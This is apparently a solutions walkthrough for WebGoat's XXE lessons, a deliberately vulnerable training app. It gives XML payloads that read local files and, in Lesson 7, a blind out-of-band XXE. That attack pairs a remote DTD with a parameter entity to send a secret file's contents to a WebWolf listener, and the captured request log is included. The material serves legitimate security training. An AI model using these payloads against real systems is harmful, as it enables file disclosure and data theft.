# (A4) XML External Entities (XXE)

## Lesson 3
Intercept the request and change the body to:
```
# On Windows
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/">]>
<comment><text>&xxe;</text></comment>

# On Linux or macOS
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
<comment><text>&xxe;</text></comment>
```

## Lesson 4
The same as the previous lesson, just change request header `Content-Type` to `application/xml`.

## Lesson 7
DTD hosted in WebWolf (see [Parameter entities](https://www.tutorialspoint.com/dtd/dtd_entities.htm)):
```
<?xml version="1.0" encoding="UTF-8"?>  
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/landing?%secret;' >" >%all;
```

Attack payload:
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE xxe [  
  <!ENTITY % secret SYSTEM "file:///c:/Users/Jan/.webgoat-@project.version@/XXE/secret.txt" >  
  <!ENTITY % dtd SYSTEM "http://localhost:9090/files/vernjan/lesson7.dtd" >  
  %dtd;
]>  
<comment>  
<text>&send;</text>  
</comment>
```

How it works:
1. XML parser evaluates parameter entity `secret`. Its value is the content of the secret file.
2. XML parser evaluates parameter entity `dtd`. Its value is loaded from remote DTD.
    3. XML parser evaluates parameter entity `all` defined in remote DTD
    4. Entity `all` is "printed/rendered" (`%all;`). The remote DTD thus become:
    ```
    <!ENTITY send SYSTEM 'http://localhost:9090/landing?THE_SECRET' >
    ```
3. Entity `dtd` is "printed/rendered" (`%dtd;`). The local DTD thus become:
    ```
    <!ENTITY send SYSTEM 'http://localhost:9090/landing?THE_SECRET' >
    ```
   
Grab the secret from WebWolf (`sunSaRLwgC`):
```json
{
  "timestamp" : "2020-04-01T07:42:44.061694600Z",
  "principal" : null,
  "session" : null,
  "request" : {
    "method" : "GET",
    "uri" : "http://localhost:9090/landing?WebGoat%208.0%20rocks...%20(sunSaRLwgC)",
    "headers" : {
      "host" : [ "localhost:9090" ],
      "connection" : [ "keep-alive" ],
      "user-agent" : [ "Java/11.0.3" ],
      "accept" : [ "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2" ]
    },
    "remoteAddress" : null
  },
  "response" : {
    "status" : 200,
    "headers" : { }
  },
  "timeTaken" : 2
}
```